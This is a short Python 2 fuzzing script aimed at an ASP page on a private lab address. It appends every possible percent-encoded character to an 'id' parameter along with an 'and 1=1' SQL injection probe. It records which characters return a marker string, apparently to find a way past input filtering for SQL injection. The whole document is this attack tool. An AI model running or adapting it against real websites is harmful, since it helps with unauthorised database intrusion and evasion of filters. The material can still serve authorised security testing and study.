import httplib
import re
import sys, time

import Queue
import threading

q=Queue.Queue()

 
url = '192.168.28.129'


for i in range(65535):
    q.put(i)

payload = '/id.asp?id'

def writeFile(filename,context):
    f= file(filename,"a+")
    f.write(context)
    f.close()
	
def fuzz():
    while not q.empty():
	i=q.get()

	result = hex(i).replace('0x','')
	
	print result
	
	if 2<len(result):
	    if len(result)<4:
	
		c = 4-len(result)
	
		b = '0'*c
	
		zz = b + hex(i).replace('0x','')
	
	    else:
	
		zz = hex(i).replace('0x','')
	
	    test = '%' + zz + '=1%20and%201=1'
	
	    conn = httplib.HTTPConnection(url)
	
	    try:
		print payload+test
		conn.request('GET',payload+test)    
	
		res  = conn.getresponse().read()
		print res
		if re.search('lufei',res):
		    
		    print 'test char:char(%s)' % zz
		    writeFile("fuzz.txt", zz+"\r\n")
	    except:
	
		pass
    

for i in range(1):

    t = threading.Thread(target=fuzz)
    t.start()
